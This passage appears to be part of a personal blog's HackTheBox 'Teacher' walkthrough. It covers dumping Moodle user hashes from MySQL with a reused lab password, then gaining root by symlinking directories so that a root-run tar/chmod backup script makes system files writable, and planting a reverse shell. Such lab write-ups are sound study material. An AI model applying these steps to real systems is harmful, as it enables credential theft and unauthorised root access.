| FILES                                 |                     
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |                                                  

</code></pre>

<p>describe is cool will show you whats in the table</p>

<p>describe pma__central_columns</p>

<p>describe pma__users</p>

<p>describe pma__usergroups</p>

<pre><code>+---------------------------------------+                                                                        
| Tables_in_information_schema          |                                                                        
+---------------------------------------+                                                                        
| ALL_PLUGINS                           |                                                                        
| APPLICABLE_ROLES                      |                                                                        
| CHARACTER_SETS                        |                                                                        
| COLLATIONS                            |                                                                        
| COLLATION_CHARACTER_SET_APPLICABILITY |                                                                        
| COLUMNS                               |                                                                        
| COLUMN_PRIVILEGES                     |
| ENABLED_ROLES                         |   
| ENGINES                               |
| EVENTS                                |                         
| FILES                                 |                     
| GLOBAL_STATUS                         |
| GLOBAL_VARIABLES                      |
| KEY_CACHES                            |
| KEY_COLUMN_USAGE                      |
| PARAMETERS                            |
| PARTITIONS                            |
| PLUGINS                               |
| PROCESSLIST                           |
| PROFILING                             |
| REFERENTIAL_CONSTRAINTS               |
| ROUTINES                              |
| SCHEMATA                              |
| SCHEMA_PRIVILEGES                     |
| SESSION_STATUS                        |
| SESSION_VARIABLES                     |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| STATISTICS                            |
| SYSTEM_VARIABLES                      |
| TABLES                                |
| TABLESPACES                           |
| TABLE_CONSTRAINTS                     |
| TABLE_PRIVILEGES                      |
| TRIGGERS                              |
| USER_PRIVILEGES                       |
| VIEWS                                 |
| GEOMETRY_COLUMNS                      |
| SPATIAL_REF_SYS                       |
| CLIENT_STATISTICS                     |
| INDEX_STATISTICS                      |
| INNODB_SYS_DATAFILES                  |
| TABLE_STATISTICS                      |
| INNODB_SYS_TABLESTATS                 |
| USER_STATISTICS                       |
| INNODB_SYS_INDEXES                    |
| XTRADB_RSEG                           |
| INNODB_CMP_PER_INDEX                  |
| INNODB_TRX                            |
| CHANGED_PAGE_BITMAPS                  |
| INNODB_FT_BEING_DELETED               |
| INNODB_LOCK_WAITS                     |
| INNODB_LOCKS                          |
| INNODB_TABLESPACES_ENCRYPTION         |
| XTRADB_INTERNAL_HASH_TABLES           |
| INNODB_SYS_FIELDS                     |
| INNODB_CMPMEM_RESET                   |
| INNODB_CMP                            |
| INNODB_FT_INDEX_TABLE                 |
| INNODB_SYS_TABLESPACES                |
| INNODB_MUTEXES                        |
| INNODB_BUFFER_PAGE_LRU                |
| INNODB_SYS_FOREIGN_COLS               |
| INNODB_CMP_RESET                      |
| INNODB_BUFFER_POOL_STATS              |
| INNODB_FT_INDEX_CACHE                 |
| INNODB_SYS_FOREIGN                    |
| INNODB_METRICS                        |
| INNODB_FT_DEFAULT_STOPWORD            |
| INNODB_CMPMEM                         |
| INNODB_SYS_TABLES                     |
| INNODB_SYS_COLUMNS                    |
| INNODB_FT_CONFIG                      |
| INNODB_BUFFER_PAGE                    |
| INNODB_CMP_PER_INDEX_RESET            |
| XTRADB_READ_VIEW                      |

select * FROM mdl_user
select * from table will spit out the content xD
desc will show the over view of the table but not the content
</code></pre>

<p>summary</p>

<p>login to mysql user root, use the password found in /www Welkom1! the passsword also works for phpmyadmin. using phpmyadmin doesn&rsquo;t show all the databases. You have to login as root to get to the moodle database. onces inside the moodle database. Go to the mdl_user table and run select * from mdl_user, the output should be the users and password for the users. giovannibak isn&rsquo;t a user for the webapp but it is a system user. after decoding giovannibak password should reveal expelled. upgrade your shell with python pty su giovannibak.</p>

<p>root</p>

<p>the script is read using -c which puts everything in a string then runs it. which might also effect wildcard exec.</p>

<p>cd /home/giovanni/work;</p>

<p>im not sure if courses/* is breaking tar wildcard exec</p>

<p>/usr/bin/backup.sh</p>

<p>tar -czvf tmp/backup_courses.tar.gz courses/*;
cd tmp;
tar -xf backup_courses.tar.gz;
chmod 777 * -R;</p>

<p>algebra has root but isn&rsquo;t suid i can write to the file in algebra but i can not add files.</p>

<p>getting root remove courses directory then symlink to the root directory. itll then tar the root directory and untar it inside tmp/courses.</p>

<p>i tried editing other directories and files i change /etc permissions tried messing with shadow file. couldn&rsquo;t change any of the passwords lol.</p>

<p>getting a shell as root, first the delete the tmp directory inside of giovanni/work. Then symlink it to /usr/bin changing the permission on backup.sh. allowing us to read write and execute as any user inside /usr/bin. :P. I dropped a reverse shell. this was tricky as there are only five lines of code and I was trying to think of ways to exploit the script to get a root shell. this method felt like something out Inception.</p>

<p>if your shell drops itll try and reconnect every couple of minutes lol</p>

<p><img src="https://chickenpwny.github.io/images/teacher/root.PNG" alt="root" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/root2.PNG" alt="root2" /></p>

<p><img src="https://chickenpwny.github.io/images/teacher/root3.PNG" alt="root3" /></p>


    
    
        <div class="chevrons">
    <div id="navigation">
<a class="nav nav-prev" href="/hackthebox/boxes/sunday/" title="sunday"> <i class="fa fa-chevron-left"></i><label>sunday</label></a>
    <a class="nav nav-next" href="/hackthebox/github/" title="GitHub" style="margin-right: 0px;"><label>GitHub</label><i class="fa fa-chevron-right"></i></a></div>
  </div>

  </section>
</article>

<footer>

<div class="footline">
    

    

    

    
    <div class="github-link">
      <a href="https://chickenpwny.github.ioHackTheBox/Boxes/teacher.md" target="blank"><i class="fa fa-code-fork"></i>
        Improve this page</a>
    </div>
    
  </div>


	<div>


  
    Create a content/_footer.md file to customize the footer content
  



	</div>
</footer>

<script src="/js/clipboard.min.js"></script>

<link href="/css/featherlight.min.css" rel="stylesheet">
<script src="/js/featherlight.min.js"></script>



<script src="/theme-flex/script.js"></script>


    

    
    

    
  </body>
</html>